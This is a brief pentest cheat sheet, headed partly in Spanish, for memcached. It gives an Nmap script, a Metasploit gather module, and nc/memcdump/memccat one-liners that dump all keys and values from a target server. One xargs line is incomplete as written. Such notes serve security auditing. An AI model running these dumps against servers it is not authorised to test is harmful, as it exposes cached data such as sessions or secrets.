## Info
### Nmap
```
nmap -p port --script memcached-info IP
```
### Metasploit module
```
auxiliary/gather/memcached_extractor
```
### Dumpear las keys y values
```
xargs -L1 -I% sh -c 'echo "get KEYNAME" | nc IP PORT'
for key in $(memcdump --server=IP); do echo ------ $key ------; memccat --server=IP $key; done
for key in $(memcdump --server=target-1); do echo ------ $key ------; memccat --server=target-1 $key; done
```
